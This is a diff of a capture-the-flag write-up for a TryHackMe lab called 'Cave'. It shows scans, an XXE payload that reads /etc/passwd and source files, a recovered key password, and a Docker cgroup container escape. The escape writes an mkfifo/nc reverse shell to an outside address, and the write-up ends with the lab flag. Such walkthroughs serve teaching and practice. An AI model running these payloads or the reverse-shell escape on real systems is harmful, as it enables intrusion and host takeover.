@@ -148,7 +148,6 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 110.44 seconds
 
-
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ gobuster -t 64 dir -e -k -u http://10.10.216.57/ -w /usr/share/wordlists/dirb/common.txt -x txt
 ===============================================================
@@ -205,7 +204,6 @@ http://10.10.216.57/lamp                 (Status: 200) [Size: 261]
 http://10.10.216.57/matches              (Status: 200) [Size: 249]
 http://10.10.216.57/walk                 (Status: 200) [Size: 161]
 
-
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ nc 10.10.216.57 3333     
 You find yourself in a cave, what do you do?
@@ -256,7 +254,6 @@ http://10.10.216.57/action.php
 
 using burp
 
-
 POST /action.php HTTP/1.1
 
 Host: 10.10.216.57
@@ -283,10 +280,7 @@ Upgrade-Insecure-Requests: 1
 
 Content-Type: application/xml
 
-
-
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
-
 
 Response
 
@@ -303,8 +297,6 @@ Content-Length: 1413
 Connection: close
 
 Content-Type: text/html; charset=UTF-8
-
-
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -333,7 +325,6 @@ sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
 cave:x:1000:1000:,,,:/home/cave:/bin/bash
 door:x:1001:1001:,,,:/home/door:/bin/bash
 skeleton:x:1002:1002:,,,:/home/skeleton:/bin/bash
-
 
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:////home/cave/src/RPG.java'>]><root>&test;</root>
 
@@ -550,7 +541,6 @@ class Serialize {
         return Base64.getEncoder().encodeToString(baos.toByteArray());
     }
 }
-
 
 ┌──(witty㉿kali)-[~/Downloads/CCT2019/results]
 └─$ nc 10.10.202.200 3333
@@ -779,7 +769,6 @@ You can see that the cave has only one way, in your right you see an old man spe
 The private key password is breakingbonessince1982 ^[[A
 It looks like the skeleton doesn't want to let anyone pass through.
 
-
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ gpg --import adventurer.priv
 gpg: key FFF6C0EECD850FDC: "adventurer <adventurer@cave.com>" not changed
@@ -788,7 +777,6 @@ gpg: Total number processed: 1
 gpg:              unchanged: 1
 gpg:       secret keys read: 1
 gpg:   secret keys imported: 1
-
 
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ scp -P 2222 door@10.10.202.200:/home/door/oldman.gpg .
@@ -823,7 +811,6 @@ Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.15.0-112-generic x86_64)
  * Documentation:  https://help.ubuntu.com
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/advantage
-
 
 This system has been minimized by removing packages and content that are
 not required on a system that users do not log into.
@@ -878,7 +865,6 @@ service apache2 start
 su - cave -c "cd /home/cave/src; ./run.sh"
 
 /bin/bash
-
 
 skeleton@cave:/tmp$ cat /proc/1/cgroup
 12:devices:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
@@ -945,7 +931,6 @@ skeleton@cave:/tmp$ ps -e
    60 ?        00:00:00 bash
    62 ?        00:00:00 run.sh
    73 ?        00:00:03 java
-
 
 skeleton@cave:/tmp$ cat startcon 
 #!/bin/bash
@@ -1062,8 +1047,6 @@ ip addr
     inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
        valid_lft forever preferred_lft forever
 
-
-
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 echo 1 > /tmp/cgrp/x/notify_on_release
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
@@ -1072,7 +1055,6 @@ echo '#!/bin/sh' > /cmd
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 1337 >/tmp/f" >> /cmd
 chmod a+x /cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
-
 
 root@cave:~# lft forever pmkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 r /tmp/cgrp/xrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir
@@ -1109,10 +1091,7 @@ And when you looked up you saw the same tree, but now you can see the sun, you'r
 
 Flag:THM{digging_down_then_digging_up}
 
-
 ```
-
-![[Pasted image 20230630201311.png]]
 
 What was the weird thing carved on the door?  
 
